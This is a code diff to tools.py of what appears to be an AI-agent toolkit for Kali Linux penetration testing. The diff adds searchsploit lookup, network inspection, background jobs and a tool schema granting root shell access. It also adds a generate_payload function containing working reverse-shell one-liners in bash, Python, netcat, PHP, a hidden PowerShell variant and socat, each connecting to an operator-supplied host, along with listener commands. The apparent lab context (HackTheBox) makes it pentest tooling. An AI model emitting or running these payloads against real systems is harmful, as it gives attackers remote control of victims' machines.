@@ -1,4 +1,4 @@
-"""tools.py — OS-level execution, Kali Linux tool orchestration, and system management tools."""
+"""tools.py — OS-level execution, Kali Linux tool orchestration, searchsploit, and payload helpers."""
 from __future__ import annotations
 
 import json
@@ -11,7 +11,8 @@ import sys
 from pathlib import Path
 from typing import Any
 
-from . import config, intel as intel_mod
+from . import config, intel as intel_mod, jobs as jobs_mod
+from .report_html import generate_html_report
 
 
 def _find_playbooks_dir() -> Path:
@@ -81,7 +82,63 @@ def run_shell(cmd: str, timeout: int = 180, cwd: str | None = None) -> CommandRe
         return CommandResult(cmd, "", str(e), 1, cwd=working_dir)
 
 
-# ── Kali OS Management Helpers ────────────────────────────────────────────────
+# ── Kali OS & Security Helpers ────────────────────────────────────────────────
+
+def search_exploits(query: str, cve: str = "") -> str:
+    """Search local Kali searchsploit database and Exploit-DB for known vulnerabilities."""
+    search_term = cve if cve else query
+    if not search_term:
+        return "Please provide a query or CVE to search."
+
+    cmd = f"searchsploit {shlex.quote(search_term)}"
+    res = run_shell(cmd, timeout=20)
+    if not res.ok and "not found" in res.stderr.lower():
+        return "searchsploit is not installed. Run: sudo apt install -y exploitdb"
+    return str(res)
+
+
+def get_network_info() -> dict[str, Any]:
+    """Retrieve detailed IP and interface information (tun0 VPN, eth0, wlan0, default gateway)."""
+    def _run(c: str) -> str:
+        return run_shell(c, timeout=5).stdout.strip()
+
+    ip_brief = _run("ip -brief address || ifconfig")
+    gateway = _run("ip route | grep default | head -n 1")
+    tun0 = _run("ip -brief addr show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1")
+    eth0 = _run("ip -brief addr show eth0 2>/dev/null | awk '{print $3}' | cut -d/ -f1")
+
+    return {
+        "tun0_vpn_ip": tun0 or "(not connected)",
+        "eth0_ip": eth0 or "(not assigned)",
+        "default_gateway": gateway or "unknown",
+        "interfaces_summary": ip_brief,
+    }
+
+
+def generate_payload(payload_type: str, lhost: str, lport: int = 9001, format_type: str = "bash") -> dict[str, str]:
+    """Generate sanitized reverse shell one-liners and listener commands."""
+    payloads = {
+        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "bash_subshell": f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
+        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
+        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f",
+        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
+        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}",
+        "socat": f"socat tcp-connect:{lhost}:{lport} exec:'/bin/bash',pty,stderr,setsid,sigint,sane",
+    }
+
+    selected_payload = payloads.get(format_type.lower(), payloads["bash"])
+    listener_nc = f"nc -lvnp {lport}"
+    listener_pwncat = f"pwncat-cs -lp {lport}"
+
+    return {
+        "payload": selected_payload,
+        "listener_netcat": listener_nc,
+        "listener_pwncat": listener_pwncat,
+        "lhost": lhost,
+        "lport": str(lport),
+    }
+
 
 def get_system_diagnostics() -> dict[str, Any]:
     """Get rich OS diagnostics from Kali Linux."""
@@ -167,32 +224,69 @@ def find_files(path: str, pattern: str = "", content_search: str = "", max_resul
     return str(res)
 
 
-# ── Built-in tools the agent can call ────────────────────────────────────────
+# ── Built-in tool schemas for AI Agent ────────────────────────────────────────
 
 TOOL_SCHEMAS = [
     {
         "name": "run_command",
         "description": (
-            "Execute any bash shell command on Kali Linux. You have full OS access to run security tools "
-            "(nmap, ffuf, nuclei, sqlmap, hydra, metasploit/msfconsole, john, hashcat, gobuster, burp, "
-            "wireshark/tshark, aircrack-ng, ghidra, radare2, impacket, netexec, docker, etc.), "
-            "write scripts, inspect network interfaces, and automate tasks. "
-            "Always include a concise description of what the command does."
+            "Execute any bash shell command on Kali Linux with full root/sudo capabilities. "
+            "Run security tools (nmap, ffuf, nuclei, sqlmap, hydra, metasploit, john, hashcat, "
+            "gobuster, burp, wireshark, aircrack-ng, ghidra, impacket, etc.) or system commands. "
+            "Set `background: true` for long-running scans."
         ),
         "parameters": {
             "type": "object",
             "properties": {
-                "command": {"type": "string", "description": "The exact shell command line string to execute"},
+                "command": {"type": "string", "description": "The exact shell command string to execute"},
                 "description": {"type": "string", "description": "Brief explanation of what this command accomplishes"},
-                "cwd": {"type": "string", "description": "Optional working directory to execute in"},
-                "timeout": {"type": "integer", "description": "Timeout in seconds (default 180)"},
+                "cwd": {"type": "string", "description": "Optional working directory"},
+                "background": {"type": "boolean", "description": "Set to true to launch as a background job (e.g. for big wordlist fuzzing / full port scans)"},
+                "timeout": {"type": "integer", "description": "Timeout in seconds for foreground commands (default 180)"},
             },
             "required": ["command", "description"],
         },
     },
     {
+        "name": "search_exploits",
+        "description": "Query the local Kali Linux searchsploit database and Exploit-DB for known vulnerabilities, CVEs, and exploit PoCs.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "query": {"type": "string", "description": "Service name and version (e.g. 'Apache 2.4.49', 'OpenSSH 8.5p1', 'WordPress 5.8')"},
+                "cve": {"type": "string", "description": "Optional CVE ID (e.g. 'CVE-2021-41773')"},
+            },
+            "required": ["query"],
+        },
+    },
+    {
+        "name": "get_network_info",
+        "description": "Inspect active network interfaces, IP addresses (including tun0 VPN for HackTheBox/Labs), default gateway, and socket status.",
+        "parameters": {
+            "type": "object",
+            "properties": {},
+        },
+    },
+    {
+        "name": "generate_payload",
+        "description": "Generate sanitized reverse shell command one-liners and corresponding netcat/pwncat listeners.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "lhost": {"type": "string", "description": "Local listening IP (e.g. tun0 IP, 10.10.14.x)"},
+                "lport": {"type": "integer", "description": "Local listening port (default 9001)"},
+                "format_type": {
+                    "type": "string",
+                    "enum": ["bash", "bash_subshell", "python", "nc", "php", "powershell", "socat"],
+                    "description": "Target payload language/shell format",
+                },
+            },
+            "required": ["lhost"],
+        },
+    },
+    {
         "name": "get_system_info",
-        "description": "Inspect Kali Linux system diagnostics: OS version, kernel, IP addresses/interfaces, listening ports/sockets, memory, disk, and active services.",
+        "description": "Inspect Kali Linux system diagnostics: OS version, kernel, IP addresses, listening ports, memory, disk, and active services.",
         "parameters": {
             "type": "object",
             "properties": {},
@@ -229,8 +323,8 @@ TOOL_SCHEMAS = [
         "parameters": {
             "type": "object",
             "properties": {
-                "path": {"type": "string", "description": "Base directory to search from (e.g. /home/kali, /var/log, /etc)"},
-                "pattern": {"type": "string", "description": "File name pattern to find (e.g. '*.conf', '*.php', 'id_rsa*')"},
+                "path": {"type": "string", "description": "Base directory to search from"},
+                "pattern": {"type": "string", "description": "File name pattern to find"},
                 "content_search": {"type": "string", "description": "Text or regex string to search inside file contents"},
                 "max_results": {"type": "integer", "description": "Maximum results to return (default 50)"},
             },
@@ -248,7 +342,7 @@ TOOL_SCHEMAS = [
     },
     {
         "name": "write_file",
-        "description": "Write or create a file on the Kali filesystem (e.g. custom scripts, payloads, wordlists, configuration files, reports).",
+        "description": "Write or create a file on the Kali filesystem.",
         "parameters": {
             "type": "object",
             "properties": {
@@ -310,6 +404,7 @@ def execute_tool(name: str, args: dict[str, Any], confirm_fn=None) -> str:
         cmd = args.get("command", "")
         desc = args.get("description", "")
         cwd = args.get("cwd")
+        is_bg = args.get("background", False)
         timeout = int(args.get("timeout", 180))
 
         if not cmd:
@@ -320,11 +415,33 @@ def execute_tool(name: str, args: dict[str, Any], confirm_fn=None) -> str:
             if not approved:
                 return "Command execution was denied by user."
 
+        if is_bg:
+            job = jobs_mod.start_job(cmd, desc, cwd=cwd)
+            return (
+                f"Started background job {job['id']} (PID {job['pid']}).\n"
+                f"Log file: {job['log_path']}\n"
+                "Use /jobs or /attach <id> to monitor progress."
+            )
+
         result = run_shell(cmd, timeout=timeout, cwd=cwd)
         output = str(result)
         if len(output) > 12000:
             output = output[:12000] + "\n... [truncated for token limit]"
         return f"Exit code {result.returncode}:\n{output}"
+
+    elif name == "search_exploits":
+        query = args.get("query", "")
+        cve = args.get("cve", "")
+        return search_exploits(query, cve)
+
+    elif name == "get_network_info":
+        return json.dumps(get_network_info(), indent=2)
+
+    elif name == "generate_payload":
+        lhost = args.get("lhost", "")
+        lport = int(args.get("lport", 9001))
+        fmt = args.get("format_type", "bash")
+        return json.dumps(generate_payload(fmt, lhost, lport, fmt), indent=2)
 
     elif name == "get_system_info":
         try:
